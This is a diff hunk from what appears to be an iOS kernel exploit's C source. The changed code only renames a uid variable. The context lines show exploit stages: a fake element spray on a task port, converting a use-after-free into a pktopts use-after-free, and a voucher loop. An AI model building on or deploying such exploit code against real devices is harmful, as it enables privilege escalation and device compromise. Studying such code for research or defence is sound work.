@@ -321,8 +321,8 @@ stage1:
     set_fake_queue_chain_for_fake_element_spray(task_port + offsetof(kport_t, ip_context) - 24, task_port + offsetof(kport_t, ip_context) - 16);
 
     cicuta_log("Stage 3: Convert uaf into pktopts uaf");
-    uint32_t uid = getuid();
-    cicuta_log("getuid() returns %u", uid);
+    uint32_t uuid = getuid();
+    cicuta_log("getuid() returns %u", uuid);
     ipc_voucher_t redeemed_voucher = IPC_VOUCHER_NULL;
     for (uint32_t i = 1; i < 167777280; ++i)
     {
